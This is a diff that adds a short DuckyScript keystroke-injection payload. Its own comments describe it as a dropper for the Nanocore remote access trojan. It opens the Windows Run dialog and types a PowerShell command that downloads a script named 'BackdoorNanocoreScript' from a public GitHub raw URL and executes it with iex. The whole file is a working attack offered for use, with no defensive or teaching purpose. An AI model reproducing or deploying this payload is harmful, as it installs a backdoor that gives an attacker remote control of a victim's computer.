@@ -1,0 +1,11 @@
+REM Arthur: Hacker-service
+REM Description: Will download a Nanocore EXE file hosted by custom public 
+REM website then execute the EXE file and you will get your connection.
+REM Basicly a dropper for the EXE file.
+DELAY 1000
+GUI r
+DELAY 1500
+STRING powershell -c $e=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/WilleLX1/F0_BK/main/CustomRawHosters/BackdoorNanocoreScript.txt');iex $e
+DELAY 500
+ENTER
+REM DONE!
